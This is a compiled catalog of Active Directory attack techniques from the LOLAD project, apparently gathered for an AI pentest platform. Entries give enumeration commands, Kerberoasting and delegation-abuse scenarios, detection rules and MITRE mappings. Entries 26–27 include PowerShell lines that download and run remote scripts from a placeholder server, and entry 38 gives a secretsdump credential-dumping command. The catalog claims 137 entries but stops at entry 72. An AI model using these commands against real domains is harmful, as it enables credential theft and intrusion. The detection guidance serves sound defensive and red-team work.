# LOLADs - Living Off the Land Active Directory: Complete Technique Catalog

**Source:** https://lolad-project.github.io/
**Compiled:** 2026-02-26
**Total Techniques:** 137 entries across 8 tactical categories
**Purpose:** Reference for ATHENA AI Pentest Platform - AD technique coverage

---

## Project Overview

The **LOLAD and Exploitation** project documents Active Directory techniques, commands, and functions that can be used natively to support offensive security operations and Red Team exercises. Unlike GTFOBins (UNIX) or LOLBAS (Windows binaries), LOLADs focuses specifically on:

- Native AD PowerShell cmdlets (`Get-ADUser`, `Get-ADComputer`, etc.)
- Built-in Windows CMD tools (`nltest`, `net`, `repadmin`, `dsquery`)
- Fileless attack patterns (in-memory execution via IEX + remote download)
- Third-party tools commonly present in environments (Impacket, Mimikatz, PowerView, PowerUp)

**Important Note:** The project has been criticized for mixing true LOTL techniques with tool-dependent methods. Some entries require PowerView, Impacket, or Mimikatz - not purely native AD features. This catalog notes the dependency for each entry.

**Related Projects:**
- GTFOBins: https://gtfobins.github.io (UNIX binaries)
- LOLBAS: https://lolbas-project.github.io (Windows binaries)
- LOLApps: https://lolapps-project.github.io (Application-based)
- LOLDrivers: https://loldrivers.io (BYOVD)

---

## Tactical Category Map

| Category | Techniques | Primary MITRE Tactic |
|----------|-----------|----------------------|
| Domain Reconnaissance | 1-75, 82-101 | Discovery (TA0007) |
| Trust & Federation Enumeration | 20, 21, 29, 30, 43, 50, 95 | Discovery (TA0007) |
| Delegation Abuse | 10, 16, 17, 75, 90 | Privilege Escalation (TA0004) |
| Credential Dumping | 38, 109-112, 128-129 | Credential Access (TA0006) |
| Kerberos Attacks | 8, 11-12, 32-33, 92, 102, 111, 125-127 | Credential Access (TA0006) |
| Persistence via Registry/GPO | 113-124, 131-133 | Persistence (TA0003) |
| Lateral Movement | 112, 127, 134 | Lateral Movement (TA0008) |
| Post-Exploitation / Impact | 123, 124, 130 | Defense Evasion / Impact |

---

## Complete Technique Catalog

Each technique includes:
- **Name** and entry number
- **Command** (exact syntax from LOLADs)
- **Tool Type** (native vs third-party dependency)
- **AD Objects/Features Abused**
- **Attack Scenario**
- **Detection Guidance**
- **MITRE ATT&CK Mapping**

---

### SECTION 1: Domain Reconnaissance - Core Enumeration

---

#### 1. Collect Domain SID
**Command:** `Get-ADDomain | Select-Object SID`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Domain object, msDS-DomainSID attribute

**Attack Scenario:** First step in most AD attack chains. The Domain SID is required to craft Golden Tickets, Silver Tickets, and SID History abuse payloads. Attackers enumerate the SID immediately after gaining any domain foothold.

**Detection:**
- Event ID 4661: A handle to an object was requested (on DC for domain object)
- LDAP query logging: queries for `(objectClass=domain)`
- Monitor `Get-ADDomain` execution in PowerShell logs (Event ID 4103/4104)
- Anomaly: Non-admin accounts querying domain SID outside business hours

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 2. List Domain Controllers
**Command:** `nltest /dclist:domain`
**Type:** CMD (Native Windows)
**Dependency:** None (nltest.exe built-in)

**AD Objects Abused:** Netlogon service, DC locator records in DNS

**Attack Scenario:** Identifies all DCs for targeting. Attackers prioritize DCs for DCSync, credential dumping, and Kerberos ticket attacks. Also used to find PDC emulator for password spray timing.

**Detection:**
- Monitor `nltest.exe` execution via Sysmon Event ID 1 or Windows Event 4688
- Netlogon service calls from non-server hosts
- SIEM rule: `process_name = "nltest.exe" AND command_line CONTAINS "/dclist"`
- Baseline: Admin hosts only

**MITRE ATT&CK:** T1018 - Remote System Discovery, T1482 - Domain Trust Discovery

---

#### 3. Enumerate Domain Groups
**Command:** `Get-ADGroup -Filter * | Select-Object Name`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Group objects, LDAP enumeration via port 389/636

**Attack Scenario:** Maps the privilege hierarchy. Identifies Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, and other high-value groups. Precursor to targeted privilege escalation.

**Detection:**
- LDAP query logs: `(objectClass=group)` with no filter
- Event ID 4661 on DCs for object enumeration
- Unusual LDAP query volume from workstations
- PowerShell Script Block Logging (Event ID 4104)

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery: Domain Groups

---

#### 4. Check AD Replication Status
**Command:** `repadmin /replsummary`
**Type:** CMD (Native Windows)
**Dependency:** repadmin.exe (installed with RSAT or on DCs)

**AD Objects Abused:** Replication metadata, DC-to-DC topology

**Attack Scenario:** Identifies replication partners and timing. Used to understand domain topology before DCSync attacks and to find DCs that may lag on password changes (window for credential reuse after compromise).

**Detection:**
- Monitor `repadmin.exe` execution from non-DC hosts
- Event ID 4688 with `repadmin.exe`
- SIEM rule: `process = "repadmin.exe" AND source_host NOT IN dc_list`

**MITRE ATT&CK:** T1018 - Remote System Discovery

---

#### 5. Enumerate Domain Users
**Command:** `Get-ADUser -Filter * | Select-Object Name, SamAccountName`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** User objects, LDAP enumeration

**Attack Scenario:** Builds target list for password spraying, Kerberoasting, and AS-REP Roasting. Full user list with SamAccountNames is the foundation of almost every AD attack chain.

**Detection:**
- LDAP query: `(objectClass=user)` with no filter returning all users
- Event ID 4661 on DCs
- Monitor for high-volume LDAP queries (>1000 user objects) from workstations
- Anomaly detection: non-admin querying all users

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 6. Get Domain Password Policy
**Command:** `Get-ADDefaultDomainPasswordPolicy`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Domain password policy object, `msDS-PasswordSettings`

**Attack Scenario:** Reveals lockout threshold, minimum password length, complexity requirements, and password history. Attackers use this to calibrate password spray timing (e.g., if lockout is 5 attempts, spray 4 attempts per account per lockout period).

**Detection:**
- LDAP query for `(objectClass=domain)` retrieving password policy attributes
- PowerShell Script Block Logging
- Monitor for this query from non-admin accounts or unusual hosts

**MITRE ATT&CK:** T1201 - Password Policy Discovery

---

#### 7. Identify Members of Domain Admins
**Command:** `Get-ADGroupMember -Identity "Domain Admins"`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Domain Admins group membership, `member` attribute

**Attack Scenario:** Identifies high-value credential targets. Attackers focus Kerberoasting, pass-the-hash, and phishing efforts on Domain Admin accounts. Also used to understand how many DA accounts exist and which have SPNs.

**Detection:**
- LDAP query for `Domain Admins` group membership
- Event ID 4661: handle requested on group object
- Alert on repeated group membership queries from same host

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery: Domain Groups

---

#### 8. Check Kerberos Ticket Policy
**Command:** `Get-ADDefaultDomainPasswordPolicy | Select-Object -ExpandProperty KerberosTicketPolicy`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Kerberos policy within domain password policy object

**Attack Scenario:** Reveals TGT lifetime, service ticket lifetime, and renewal settings. Used to understand how long forged tickets (Golden/Silver) remain valid and when to refresh stolen TGTs.

**Detection:**
- Same as #6 - monitors for domain object queries
- This specific query returns Kerberos policy embedded in the password policy object

**MITRE ATT&CK:** T1558 - Steal or Forge Kerberos Tickets (reconnaissance phase)

---

#### 9. List All Organizational Units (OUs)
**Command:** `Get-ADOrganizationalUnit -Filter *`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** OU objects, organizational hierarchy

**Attack Scenario:** Maps the AD structure to identify high-value OUs (Servers, Domain Controllers, Finance, HR). Used to target GPO abuse (link malicious GPO to specific OU) and scope BloodHound-like analysis.

**Detection:**
- LDAP query: `(objectClass=organizationalUnit)` without filter
- Monitor from non-admin accounts

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery

---

#### 10. Identify Users with Delegation Privileges
**Command:** `Get-ADUser -Filter {TrustedForDelegation -eq $true}`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** `TrustedForDelegation` attribute on user objects (Unconstrained Delegation)

**Attack Scenario:** Unconstrained Delegation allows a service to impersonate any user. If an attacker compromises a user with `TrustedForDelegation`, they can request TGTs on behalf of any user who authenticates to that service, including Domain Admins.

**Detection:**
- LDAP query: `(TrustedForDelegation=TRUE)(objectClass=user)`
- Alert: Any modification of `TrustedForDelegation` attribute (Event ID 4738)
- Monitor for authentication to machines with unconstrained delegation by privileged accounts

**MITRE ATT&CK:** T1134.001 - Access Token Manipulation: Token Impersonation/Theft

---

#### 11. List AD Users with Details
**Command:** `Get-ADUser -Filter * -Properties DisplayName, EmailAddress, LastLogonDate`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** User objects, extended properties (LDAP attributes)

**Attack Scenario:** Collects email addresses for phishing campaigns, last logon dates to identify dormant accounts (prime candidates for password spray - less likely to be monitored), and display names for social engineering.

**Detection:**
- High-volume LDAP query requesting extended properties on all user objects
- Network anomaly: large LDAP response from DC to workstation

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 12. Identify Accounts with SPNs (Kerberoasting)
**Command:** `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** `ServicePrincipalName` attribute on user objects

**Attack Scenario:** **Kerberoasting.** Any domain user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's NTLM hash and can be cracked offline. This technique has no lockout and requires no elevated privileges.

**Detection:**
- LDAP query: `(&(objectClass=user)(servicePrincipalName=*))`
- Event ID 4769: Kerberos service ticket request (with RC4 encryption type 23 - strong indicator)
- Splunk: `index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17`
- Alert: Bulk TGS requests from single account in short timeframe

**MITRE ATT&CK:** T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

---

#### 13. Find Admin Accounts
**Command:** `dsquery user -name *admin*`
**Type:** CMD (Native Windows)
**Dependency:** dsquery.exe (RSAT)

**AD Objects Abused:** User objects with "admin" in their name

**Attack Scenario:** Quick enumeration of naming-convention-based admin accounts. Finds local admin, service accounts, and DA accounts that follow naming patterns like `svc_admin`, `db_admin`, `jadmin`.

**Detection:**
- Monitor `dsquery.exe` execution (Event ID 4688 or Sysmon 1)
- LDAP query with wildcard name filter

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 14. List All Domain Computers
**Command:** `Get-ADComputer -Filter * | Select-Object Name, OperatingSystem`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Computer objects, `operatingSystem` attribute

**Attack Scenario:** Maps all domain-joined machines. Attackers look for older OS versions (Windows Server 2008, Windows 7) with known unpatched vulnerabilities (EternalBlue, PrintSpooler). Also identifies servers vs workstations for lateral movement targeting.

**Detection:**
- LDAP query: `(objectClass=computer)` returning all computers
- Monitor from workstation-class hosts

**MITRE ATT&CK:** T1018 - Remote System Discovery

---

#### 15. Check Group Policy Objects (GPOs)
**Command:** `Get-GPO -All`
**Type:** PowerShell (Native - Group Policy module)
**Dependency:** Group Policy PowerShell module (RSAT)

**AD Objects Abused:** GPO objects in `CN=Policies,CN=System,DC=domain,DC=com`

**Attack Scenario:** Enumerates all GPOs to find misconfigured ones. Attackers look for GPOs with write permissions for non-admin accounts (GPO abuse), scripts executed via GPO, and software deployment GPOs that can be abused for code execution.

**Detection:**
- Monitor `Get-GPO` execution
- LDAP query for GPO container
- Track GPO read access in audit logs

**MITRE ATT&CK:** T1484.001 - Domain Policy Modification: Group Policy Modification

---

#### 16. List Privileged Groups
**Command:** `net group "Domain Admins" /domain`
**Type:** CMD (Native Windows)
**Dependency:** net.exe (built-in)

**AD Objects Abused:** Domain Admins group, NetBIOS group membership query

**Attack Scenario:** Classic reconnaissance. Identifies Domain Admin members for targeted credential theft. Also queries other groups: Enterprise Admins, Schema Admins, Backup Operators (can bypass file permissions), Account Operators.

**Detection:**
- Monitor `net.exe` with `/domain` flag
- Event ID 4661 or Windows Event 4799 (group membership enumeration)
- SIEM: `process_name="net.exe" AND command_line CONTAINS "/domain"`

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery: Domain Groups

---

#### 17. Find Machines with Unconstrained Delegation
**Command:** `Get-ADComputer -Filter {TrustedForDelegation -eq $true}`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Computer objects with `TrustedForDelegation` flag set

**Attack Scenario:** **Unconstrained Delegation Attack.** When a privileged user (like a DC) authenticates to a machine with unconstrained delegation, their TGT is stored in memory. An attacker who has compromised that machine can extract the TGT and impersonate the user. Combined with PrinterBug or PetitPotam to coerce DC authentication.

**Detection:**
- LDAP query: `(&(objectClass=computer)(TrustedForDelegation=TRUE))`
- Alert: Any machine (other than DCs) gaining `TrustedForDelegation` attribute
- Monitor Kerberos TGT forwarding events
- Event ID 4769 with forwardable tickets to machines with unconstrained delegation

**MITRE ATT&CK:** T1134.001 - Access Token Manipulation: Token Impersonation/Theft

---

#### 18. Check User Account Lockout Status
**Command:** `Get-ADUser -Filter * -Properties LockedOut | Where-Object {$_.LockedOut -eq $true}`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** `lockoutTime` attribute on user objects

**Attack Scenario:** Two uses: (1) Attackers find locked accounts as evidence of active password spraying by other attackers or security teams, indicating valid usernames. (2) Defenders use this to identify brute-force victims. Attackers also target unlocked accounts for spraying.

**Detection:**
- Periodic LDAP queries checking lockout status may indicate attacker monitoring spray progress
- Baseline normal lockout queries (IT helpdesk)

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 19. Identify Expired Passwords
**Command:** `Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** `pwdLastSet` attribute

**Attack Scenario:** Identifies accounts with expired passwords. These may be stale service accounts with weak, guessable passwords that haven't been rotated. Also surfaces accounts that may use default or simple passwords due to policy expiration.

**Detection:**
- Monitor `Search-ADAccount` cmdlet usage

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 20. Query All Domain Services
**Command:** `nltest /dsgetdc:domain`
**Type:** CMD (Native Windows)
**Dependency:** nltest.exe (built-in)

**AD Objects Abused:** DC locator mechanism (DNS SRV records), Netlogon

**Attack Scenario:** Finds the closest DC for the current site. Used to identify which DC to target for attacks requiring direct DC access (DCSync, LDAP relay, Zerologon).

**Detection:**
- Monitor `nltest.exe` execution
- Netlogon debug logging

**MITRE ATT&CK:** T1018 - Remote System Discovery

---

#### 21. Enumerate Trusted Domains
**Command:** `nltest /trusted_domains`
**Type:** CMD (Native Windows)
**Dependency:** nltest.exe (built-in)

**AD Objects Abused:** Domain trust relationships, `trustedDomain` objects

**Attack Scenario:** Identifies all trusted domains for cross-domain/cross-forest attack paths. Trust relationships can allow privilege escalation from a child domain to parent forest if `SIDFilteringForestAware` is not configured. Also used to find External Trusts for pivot points.

**Detection:**
- Monitor `nltest.exe` with `/trusted_domains`
- Event ID 4706/4707: Trust creation/deletion
- Alert on trust enumeration from non-DC hosts

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 22. List AD Sites
**Command:** `Get-ADReplicationSite -Filter *`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Sites and Services objects (`CN=Sites,CN=Configuration`)

**Attack Scenario:** Maps the physical AD topology. Attackers use site information to understand network segmentation and identify DCs at remote sites that may have weaker security controls.

**Detection:**
- LDAP query on Configuration partition for site objects

**MITRE ATT&CK:** T1018 - Remote System Discovery

---

#### 23. Get Domain Forest Information
**Command:** `Get-ADForest`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** Forest root domain object

**Attack Scenario:** Identifies the forest root, all domains in the forest, global catalog servers, and forest functional level. Enterprise Admins only exist in the forest root - identifying it is critical for privilege escalation planning.

**Detection:**
- LDAP query for forest root domain object
- Monitor from non-admin accounts

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 24. Find SID History for Users (SID History Abuse)
**Command:** `Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory}`
**Type:** PowerShell (Native AD)
**Dependency:** RSAT / AD PowerShell module

**AD Objects Abused:** `sIDHistory` attribute on user objects

**Attack Scenario:** **SID History Abuse.** SID History is a migration attribute that allows a user to retain access to resources from a previous domain. Attackers inject Domain Admins SIDs into a compromised account's SID History using Mimikatz (`misc::addsid`), granting DA-level access without being a DA. Also abused in cross-domain trust attacks.

**Detection:**
- Alert: Any modification of `sIDHistory` attribute (Event ID 4738)
- LDAP query for SIDHistory attribute on all users
- Event ID 4765: SID History was added to an account
- Block: Disable SID filtering only when explicitly needed for migrations

**MITRE ATT&CK:** T1134.005 - Access Token Manipulation: SID-History Injection

---

#### 25. Check Domain Controller Certificates
**Command:** `certutil -dcinfo verify`
**Type:** CMD (Native Windows)
**Dependency:** certutil.exe (built-in)

**AD Objects Abused:** AD CS (Certificate Services) configuration, DC certificates

**Attack Scenario:** Recon for ADCS attacks (ESC vulnerabilities). Understanding the CA infrastructure is prerequisite for ESC1-ESC8 certificate template abuse, Golden Certificate attacks, and pass-the-certificate techniques.

**Detection:**
- Monitor `certutil.exe` execution, especially with `/dcinfo` flag
- Event ID 4688

**MITRE ATT&CK:** T1649 - Steal or Forge Authentication Certificates

---

### SECTION 2: PowerView-Based Enumeration

*Note: Techniques 26-40 use PowerView (PowerSploit). While frequently available in environments, PowerView is a third-party tool, not a native AD feature. This is a known limitation of the LOLAD project.*

---

#### 26. Import PowerView Module (Fileless)
**Command:** `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1'); Get-NetUser"`
**Type:** PowerShell (Fileless execution)
**Dependency:** Network access to PowerView host, PowerShell

**AD Objects Abused:** User objects via LDAP enumeration

**Attack Scenario:** **Fileless technique.** Downloads and executes PowerView entirely in memory without touching disk, evading traditional AV. The `IEX` pattern is a classic LOLBin technique applied to PowerShell.

**Detection:**
- AMSI (Antimalware Scan Interface) catches PowerView in modern environments
- PowerShell Script Block Logging (Event ID 4104): captures the downloaded content
- Network detection: HTTP request from PowerShell process to external/internal server
- Command-line: `IEX` + `DownloadString` pattern is high-fidelity indicator
- Sysmon Event ID 3: Network connection from PowerShell

**MITRE ATT&CK:** T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information

---

#### 27. Import PowerUp Module (Fileless)
**Command:** `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerUp.ps1'); Invoke-AllChecks"`
**Type:** PowerShell (Fileless execution)
**Dependency:** Network access, PowerShell

**AD Objects Abused:** Local privilege escalation paths (not AD objects directly)

**Attack Scenario:** Fileless loading of PowerUp for local privilege escalation. PowerUp checks for unquoted service paths, weak service permissions, DLL hijacking opportunities, and AlwaysInstallElevated policy.

**Detection:**
- Same as #26: AMSI, Script Block Logging, network connections from PowerShell
- `Invoke-AllChecks` string in script block logs is high-fidelity

**MITRE ATT&CK:** T1059.001 - PowerShell, T1068 - Exploitation for Privilege Escalation

---

#### 28. Find Domain Admins with PowerView
**Command:** `Get-NetGroup -GroupName "Domain Admins" | Get-NetGroupMember`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** Domain Admins group, LDAP enumeration

**Attack Scenario:** Enumerate DA members with additional context (SID, object class, when added). PowerView provides richer output than native cmdlets and can resolve nested group membership.

**Detection:**
- PowerShell Script Block Logging for `Get-NetGroup`
- LDAP query patterns

**MITRE ATT&CK:** T1069.002 - Permission Groups Discovery: Domain Groups

---

#### 29. List All Domains with PowerView
**Command:** `Get-NetDomain`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** Domain objects

**Attack Scenario:** Quick domain enumeration. Returns forest name, domain mode, DCs, and PDC.

**Detection:** Script Block Logging for `Get-NetDomain`

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 30. Enumerate Domain Trusts with PowerView
**Command:** `Get-NetDomainTrust`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** `trustedDomain` objects in AD

**Attack Scenario:** Richer trust enumeration than `nltest`. Shows trust direction, transitivity, and type. Used to identify exploitable trust paths (child-to-parent escalation, External Trust pivot).

**Detection:**
- Script Block Logging for `Get-NetDomainTrust`
- LDAP query for trust objects

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 31. Find Local Privilege Escalation Paths with PowerUp
**Command:** `Invoke-AllChecks`
**Type:** PowerShell (PowerUp)
**Dependency:** PowerUp

**AD Objects Abused:** Local system configuration (services, registry, scheduled tasks)

**Attack Scenario:** Comprehensive local privilege escalation check. Finds unquoted service paths, modifiable service binaries, DLL injection paths, AlwaysInstallElevated, token privileges, and more. Run immediately after initial compromise.

**Detection:**
- Script Block Logging for `Invoke-AllChecks`
- Service enumeration calls in rapid succession

**MITRE ATT&CK:** T1068 - Exploitation for Privilege Escalation

---

#### 32. Identify Local Administrators with PowerUp
**Command:** `Get-LocalGroupMember -Group "Administrators"`
**Type:** PowerShell (Native)
**Dependency:** None (PowerShell built-in)

**AD Objects Abused:** Local SAM database, Administrators group

**Attack Scenario:** Identifies who has local admin access to a machine. Used to find lateral movement paths (other accounts that can be used on other machines).

**Detection:**
- Event ID 4799: A security-enabled local group membership was enumerated
- Monitor this from non-admin processes

**MITRE ATT&CK:** T1069.001 - Permission Groups Discovery: Local Groups

---

#### 33. Search for Kerberoastable Accounts with PowerView
**Command:** `Get-NetUser -SPN | Select-Object servicePrincipalName`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** `servicePrincipalName` attribute on user objects

**Attack Scenario:** PowerView version of Kerberoasting target discovery. Returns user accounts with SPNs - requesting a TGS for these will yield a hash crackable offline.

**Detection:**
- Script Block Logging for `Get-NetUser -SPN`
- Combined with Event ID 4769 monitoring for subsequent TGS requests

**MITRE ATT&CK:** T1558.003 - Kerberoasting

---

#### 34. List All Sessions on Domain Machines with PowerView
**Command:** `Get-NetSession -ComputerName target-machine`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView (uses NetSessionEnum API)

**AD Objects Abused:** NetBIOS Session API (SMB/NetBIOS named pipe)

**Attack Scenario:** Identifies which users are currently logged in to target machines. Attackers use this to find machines where Domain Admins are actively logged in - prime targets for pass-the-hash or credential dumping attacks.

**Detection:**
- NetBIOS session enumeration (port 139/445) to multiple machines in rapid succession
- Event ID 4624/4634 correlation with unusual source hosts
- PowerView's session enum uses `NetSessionEnum` - can be detected at the API level

**MITRE ATT&CK:** T1049 - System Network Connections Discovery

---

#### 35. Enumerate Local Admins on All Domain Machines with PowerView
**Command:** `Invoke-EnumerateLocalAdmin -ComputerName target-machine`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView (uses NetLocalGroupGetMembers API)

**AD Objects Abused:** SMB/Named pipe to target machines, local SAM

**Attack Scenario:** Maps local admin access across the domain. Used with BloodHound-style analysis to find lateral movement paths from current position to Domain Admin.

**Detection:**
- SMB connections to multiple hosts from single source
- Named pipe access to `IPC$` across multiple machines
- High-volume Event ID 4625/4648 on target machines

**MITRE ATT&CK:** T1021.002 - Remote Services: SMB/Windows Admin Shares

---

#### 36. Find Weak File Permissions with PowerUp
**Command:** `Invoke-CheckLocalAdminAccess`
**Type:** PowerShell (PowerUp)
**Dependency:** PowerUp

**AD Objects Abused:** SMB shares, local admin check across domain machines

**Attack Scenario:** Tests which domain machines the current user has local admin access to. Used to identify lateral movement targets where the current account already has admin rights (via password reuse, group membership, etc.).

**Detection:**
- Rapid SMB authentication attempts to multiple machines
- Event ID 4624 Type 3 logons from single source to many destinations

**MITRE ATT&CK:** T1069.001 - Local Group Discovery, T1021.002 - SMB

---

#### 37. Check Writable Registry Paths with PowerUp
**Command:** `Invoke-AllChecks | Select-Object WritableRegPaths`
**Type:** PowerShell (PowerUp)
**Dependency:** PowerUp

**AD Objects Abused:** Windows Registry (HKLM service entries)

**Attack Scenario:** Finds registry paths writable by non-privileged users, indicating service hijacking opportunities. Common finding in environments where service accounts run with excessive privileges.

**Detection:**
- Registry write access auditing on service keys
- Script Block Logging

**MITRE ATT&CK:** T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness

---

#### 38. Dump Domain Hashes with SecretsDump
**Command:** `secretsdump.py domain/username:password@target`
**Type:** Python (Impacket)
**Dependency:** Impacket framework

**AD Objects Abused:** DRSUAPI replication interface (for DCSync), SAM/LSA secrets (for local), NTDS.dit

**Attack Scenario:** **DCSync / Credential Dumping.** Can dump all domain hashes using DCSync (requires Replication rights) or dump local SAM/LSA from a remote machine. DCSync doesn't require running code on the DC - it uses legitimate replication protocol.

**Detection:**
- Event ID 4662: An operation was performed on an object - filter for `Control Access` right on Domain object with `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes) GUID
- Alert: Non-DC machine performing DCSync (DS-Replication operations)
- Network: Look for DRSUAPI traffic from non-DC to DC

**MITRE ATT&CK:** T1003.006 - OS Credential Dumping: DCSync

---

#### 39. Check Domain Policies with PowerView
**Command:** `Get-DomainPolicy`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** Domain policy GPO (`CN={31B2F340-016D-11D2-945F-00C04FB984F9}`)

**Attack Scenario:** Retrieves the Default Domain Policy settings including password policy, Kerberos policy, and system access controls. Used to understand the security posture and identify relaxed settings.

**Detection:** Script Block Logging for `Get-DomainPolicy`

**MITRE ATT&CK:** T1201 - Password Policy Discovery

---

#### 40. Identify Interesting ACLs with PowerView
**Command:** `Find-InterestingDomainAcl`
**Type:** PowerShell (PowerView)
**Dependency:** PowerView

**AD Objects Abused:** Access Control Lists (ACLs) on AD objects

**Attack Scenario:** **ACL Abuse.** Scans for misconfigured ACLs across the domain - accounts with `WriteDACL`, `GenericWrite`, `WriteOwner`, `AllExtendedRights`, or `GenericAll` on high-value objects. These permissions allow privilege escalation without exploiting vulnerabilities (BloodHound attack paths).

**Detection:**
- LDAP queries reading security descriptors (nTSecurityDescriptor) on all objects
- High-volume security descriptor reads from non-admin accounts
- Script Block Logging

**MITRE ATT&CK:** T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification, T1098 - Account Manipulation

---

### SECTION 3: Extended Domain Enumeration

---

#### 41. Enumerate Domain Users (LDAP)
**Command:** `dsquery user -name *`
**Type:** CMD (Native - dsquery.exe)
**Dependency:** RSAT

**AD Objects Abused:** User objects via LDAP

**Attack Scenario:** LDAP-based user enumeration using dsquery. Useful when PowerShell is restricted. Returns all user objects' distinguished names.

**Detection:**
- Monitor `dsquery.exe` execution (Event ID 4688)
- LDAP query with wildcard user filter

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 42-43. Get Domain Information / Enumerate Domain Forest
**Commands:** `Get-ADDomain` / `Get-ADForest`
**Type:** PowerShell (Native AD)

**Attack Scenario:** Basic domain/forest reconnaissance. Returns DCs, forest root, domain SID, domain functional level, and more. First commands run during AD enumeration.

**Detection:** PowerShell Script Block Logging, LDAP query monitoring

**MITRE ATT&CK:** T1482 - Domain Trust Discovery

---

#### 44. List All Users in the Domain
**Command:** `net user /domain`
**Type:** CMD (Native)
**Dependency:** net.exe (built-in)

**AD Objects Abused:** User accounts via NetUser API

**Attack Scenario:** Quick native CMD enumeration of all domain users. Works even when PowerShell is restricted. Used in constrained environments.

**Detection:**
- Monitor `net.exe` with `/domain` flag
- Event ID 4661 or 4799

**MITRE ATT&CK:** T1087.002 - Account Discovery: Domain Account

---

#### 45. Get Domain Functional Level
**Command:** `Get-ADDomain | Select-Object DomainMode`
**Type:** PowerShell (Native AD)

**Attack Scenario:** Determines which AD features are available. Older functional levels may enable specific attacks (e.g., RC4 Kerberos encryption type). Also used to understand patching posture of the domain.

**MITRE ATT&CK:** T1082 - System Information Discovery

---

#### 46-50. Additional DC and Infrastructure Discovery
**Commands:**
- `nltest /dclist:domain` - DCs in domain
- `nltest /dsgetsite` - Current site
- `Get-ADComputer -Filter *` - All computers
- `Get-ADReplicationSubnet -Filter *` - Subnet topology
- `nltest /dsgetdc:domain /ldaponly` - LDAP-specific DC

**Attack Scenario:** Complete topology mapping. LDAP-only DC query is useful when Kerberos is not available. Subnet mapping reveals network segmentation.

**MITRE ATT&CK:** T1018 - Remote System Discovery, T1016 - System Network Configuration Discovery

---

#### 51-68. DNS, Password Policy, Service Account, and GPO Enumeration

These entries (51-68) cover additional native enumeration:

| # | Technique | Command | Key Value |
|---|-----------|---------|-----------|
| 52 | Get AD DNS Zone | `Get-DnsServerZone` | Find DNS zones for subdomain discovery |
| 55 | List Service Accounts | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}` | Kerberoasting targets |
| 56 | Get Password Policy | `Get-ADDefaultDomainPasswordPolicy` | Spray timing calibration |
| 57 | List Open Shares | `net view \\target-machine` | SMB share discovery |
| 60 | GPO for Computer | `gpresult /r /scope computer` | Applied GPO analysis |
| 63 | Password Expiration | `net accounts /domain` | Policy discovery |
| 64 | Get DCs | `Get-ADDomainController -Filter *` | DC targeting |

**MITRE ATT&CK:** T1016, T1018, T1082, T1201, T1135

---

#### 72. Check Domain Admin Account Status
**Command:** `Get-ADUser -Filter {MemberOf -RecursiveMatch 'Domain Admins'} | Select-Object Name, Enabled`
**Type:** PowerShell (Native AD)

**Attack Scenario:** Finds ALL DA accounts including nested membership. Standard `Get-ADGroupMember` misses users who are indirect DAs (member of a group that is a member of Domain Admins). This recursive check finds them all.

